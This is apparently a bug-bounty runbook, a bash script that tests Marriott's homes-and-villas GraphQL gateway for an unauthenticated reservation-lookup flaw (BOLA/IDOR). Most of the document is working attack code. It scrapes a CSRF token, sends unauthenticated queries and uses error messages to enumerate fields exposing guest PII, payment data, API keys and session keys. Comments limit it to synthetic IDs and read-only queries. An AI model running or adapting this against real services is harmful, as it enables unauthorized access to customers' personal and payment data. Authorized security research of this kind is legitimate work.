#!/usr/bin/env bash
# =============================================================================
# Marriott — HnV reservationDetails BOLA/IDOR test (session42)
# Portable: Linux / Pi / Termux.
#
# s41: /gateway/graphql reachable unauth via x-hvmi-csrf-token. Error oracle
# revealed reservationDetails(confirmation_id: ID!) — and the validation layer
# asked for the ARG, not for auth. HnV has 17 prior IDOR reports. This tests
# whether the reservationDetails RESOLVER enforces auth/ownership:
#   A. reservationDetails(confirmation_id:"<SYNTHETIC>"){__typename}
#      -> null/not-found = resolver runs WITHOUT auth (BOLA structurally confirmed)
#      -> Unauthorized/session error = resolver is auth-gated
#   B. Enumerate the reservation return-type fields via error oracle (reveals
#      what PII a valid id would expose: guest name/email/dates/payment...)
#   C. Same auth check on freedomPayDetails / travelInsuranceDetails (returned
#      data unauth in s41) — enumerate fields to assess what they leak.
#
# SAFETY (critical): SYNTHETIC confirmation ids ONLY — values that match no real
# reservation. We do NOT enumerate real confirmation numbers or pull any third
# party's reservation. READ-ONLY queries, no mutations. If a real person's PII
# ever appears, STOP and document only the synthetic-id structural proof.
#
# Run (Termux): OUTDIR=$HOME/s42 bash runbooks/PI-RUNBOOK-session42-hnv-reservation-idor.sh \
#                 2>&1 | tee $HOME/s42/s42.log
# =============================================================================
set -o pipefail
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s42
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s42"
  else OUTDIR="$HOME/s42"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
IDH='X-Bug-Bounty: hackerone-researcher'
T="homes-and-villas.marriott.com"; B="https://$T"; JAR="$OUTDIR/jar.txt"
SYN="ZZTEST-0000-0000-NOTREAL"   # synthetic confirmation id (matches nothing)

echo "============================================================"
echo "HNV reservationDetails BOLA  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "Work: $OUTDIR   synthetic id: $SYN"
echo "============================================================"; echo ""

curl -s -o "$OUTDIR/home.html" -c "$JAR" -H "User-Agent: $UA" -H "$IDH" --max-time 25 "$B/" >/dev/null || true
TOK=$(grep -oE 'id="sourceid"[^>]*data-source="[^"]+"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*data-source="([^"]+)".*/\1/')
[ -z "$TOK" ] && TOK=$(grep -oE '"csrfToken":"[^"]+"' "$OUTDIR/home.html" | head -1 | sed -E 's/.*:"([^"]+)"/\1/')
echo "csrf token: ${TOK:0:30}..."
echo ""

gq() { # json tag
  curl -s -o "$OUTDIR/$2.json" -b "$JAR" \
    -H "User-Agent: $UA" -H "$IDH" -H 'Content-Type: application/json' \
    -H 'Accept: application/json' -H "Origin: $B" -H "Referer: $B/" \
    -H "x-hvmi-csrf-token: $TOK" --max-time 20 --data "$1" \
    -w '%{http_code}|%{size_download}' "$B/gateway/graphql" 2>/dev/null || echo "000|0"
}

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE A: DOES reservationDetails RESOLVER REQUIRE AUTH? ═══"
m=$(gq "{\"query\":\"query R(\$c:ID!){reservationDetails(confirmation_id:\$c){__typename}}\",\"variables\":{\"c\":\"$SYN\"}}" a-resv)
echo "  reservationDetails(confirmation_id:SYNTHETIC){__typename}"
echo "  -> ${m%|*} | ${m#*|}B"
echo "  body: $(cat "$OUTDIR/a-resv.json")"
echo ""
python3 - << 'PYEOF'
import os,json
O=os.environ["OUTDIR"]
b=open(f"{O}/a-resv.json").read()
low=b.lower()
if any(k in low for k in ("unauthor","forbidden","not logged","login","session","authenticate","token")) and 'csrf' not in low:
    print("  >>> AUTH-GATED: resolver requires a session. Capture hvmi_signInToken next.")
elif '"reservationdetails":null' in low.replace(" ","") or '"reservationdetails": null' in low:
    print("  >>> *** UNAUTH RESOLVER: returned null for a synthetic id with NO auth.")
    print("  >>> = reservationDetails runs without a session -> confirmation_id is the")
    print("  >>> ONLY gate -> Broken Object Level Authorization (BOLA/IDOR).")
elif '"data"' in low and 'reservationdetails' in low:
    print("  >>> Resolver executed unauth and returned a value (inspect — synthetic")
    print("  >>> should be null; if not, investigate).")
else:
    print("  >>> Inspect body above (may be a different error).")
PYEOF
echo ""

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE B: ENUMERATE reservation return-type FIELDS (what a valid id exposes) ═══"
echo "  valid field -> data:null (executes); invalid -> 'Cannot query field X on type <T>'"
RT=""
for F in id status confirmationId guestFirstName guestLastName firstName lastName \
         guestName email emailAddress phone phoneNumber checkInDate checkOutDate \
         arrivalDate departureDate nights numberOfGuests adults totalPrice total \
         amount currency propertyName propertyId listingId hostName hostEmail \
         address city country paymentMethod cardLast4 createdAt specialRequests \
         loyaltyNumber memberId marshaCode; do
  m=$(gq "{\"query\":\"query R(\$c:ID!){reservationDetails(confirmation_id:\$c){$F}}\",\"variables\":{\"c\":\"$SYN\"}}" "b-$F")
  body=$(cat "$OUTDIR/b-$F.json")
  if echo "$body" | grep -q "Cannot query field"; then
    : # absent
    [ -z "$RT" ] && RT=$(echo "$body" | grep -oE 'on type \\?"[A-Za-z0-9_]+' | head -1 | sed -E 's/.*"//')
  elif echo "$body" | grep -qiE 'unauthor|forbidden|session'; then
    echo "    [auth] $F -> $(echo "$body"|head -c 80)"
  else
    echo "    PRESENT  $F"
  fi
  sleep 0.3
done
echo "  reservation return type name: ${RT:-(unknown)}"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE C: freedomPayDetails / travelInsuranceDetails FIELDS (returned data unauth) ═══"
for OP in freedomPayDetails travelInsuranceDetails; do
  echo "  -- $OP --"
  for F in id type status amount currency paymentToken token merchantId apiKey \
           clientId sessionKey config url endpoint provider account; do
    m=$(gq "{\"query\":\"query{${OP}{$F}}\"}" "c-$OP-$F")
    body=$(cat "$OUTDIR/c-$OP-$F.json")
    echo "$body" | grep -q "Cannot query field" || echo "    PRESENT  $OP.$F :: $(echo "$body"|head -c 100|tr '\n' ' ')"
    sleep 0.25
  done
done
echo ""

echo "════════════════════════════════════════════"
echo "VERDICT"
echo "════════════════════════════════════════════"
echo "  Phase A decides it:"
echo "   - null/not-found unauth  -> reservationDetails is BOLA. The PII fields"
echo "     enumerated in Phase B are what any guessed/known confirmation_id exposes"
echo "     to an UNAUTHENTICATED attacker. That's the finding (High/Critical)."
echo "   - Unauthorized/session   -> resolver is auth-gated; pivot to authenticated"
echo "     IDOR (own reservation, logged-out replay)."
echo "  Do NOT query real confirmation numbers. Synthetic-id structural proof only."
echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
